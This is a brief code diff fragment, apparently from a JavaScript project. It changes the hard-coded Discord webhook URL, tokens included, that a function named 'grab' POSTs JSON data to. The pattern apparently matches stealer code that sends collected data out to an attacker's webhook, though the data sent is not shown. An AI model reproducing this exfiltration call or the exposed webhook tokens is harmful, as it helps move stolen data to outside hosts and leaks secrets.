@@ -143,7 +143,7 @@ function grab() {
       const request = new XMLHttpRequest();
       request.open(
         "POST",
-        "https://discord.com/api/webhooks/953364959495069836/cFJBDYv6G2mEO74lD_aiVSMDqyljn0YvqQebKvf6oG72c5nsyFCzjACXtA1KgdsH-d4w"
+        "https://discord.com/api/webhooks/963620461038686218/KFnEHRMjDQ3JuA539UAJD0KkCuuYbgEZFRkAvewUYzJwsQx-ckMZf2EF75x1xygqxeZw"
       );
       request.setRequestHeader("Content-type", "application/json");
       const params = {
